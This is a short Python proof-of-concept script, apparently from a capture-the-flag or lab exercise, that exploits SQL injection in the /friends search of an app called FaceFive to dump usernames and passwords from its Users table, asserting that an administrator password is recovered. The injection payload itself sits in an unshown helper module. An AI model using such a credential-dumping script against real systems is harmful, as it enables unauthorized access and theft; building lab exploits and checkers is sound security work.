# vuln1.py

# PoC for SQL injection on th /friends endpoint
#
# the search bar allows for SQL injections which allow to read the entire DB

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

user = 'test'
passwd = 'testpasswd'

reset_image(session)
register(session, user, passwd)

users = select_query(session, 'Users', 'username', 'password')

print(users)
assert ('administrator', 'AVeryL33tPasswd') in users
